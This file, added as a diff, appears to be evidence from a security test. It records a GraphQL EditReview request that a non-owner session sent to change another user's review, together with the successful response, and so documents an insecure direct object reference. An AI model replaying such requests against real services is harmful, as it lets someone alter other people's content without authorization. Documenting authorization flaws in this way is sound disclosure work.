@@ -1,0 +1,23 @@
+# IDOR — restore by the non-owner (repeatability)
+# Run: 2026-11-27, same B session, immediately after the marker edit.
+# Transcribed from flow.log record e=idor (second call).
+
+POST /gql/batch
+x-apollo-operation-name: EditReview
+
+[{"operationName":"EditReview",
+  "variables":{"input":{
+    "reviewEncid":"09773aYTIbSk12Zt2sHnnQ",
+    "rating":5,
+    "comment":"<A's original text, restored verbatim>",
+    "reviewOrigin":"biz-details-war-button"}},
+  "extensions":{"operationType":"mutation",
+    "documentId":"455125ba4964e2cf3041036d2b973924ab3fe4ce4ff25bbbc8ee94ef977d9609"}}]
+
+HTTP 200
+
+[{"data":{"editReview":{"__typename":"EditReviewSuccess",
+  "review":{"encid":"09773aYTIbSk12Zt2sHnnQ","__typename":"Review"}}}}]
+
+# Two successes from a non-owner = stable authorization gap, not a cache artifact.
+# Victim review left with original text and 5 stars.
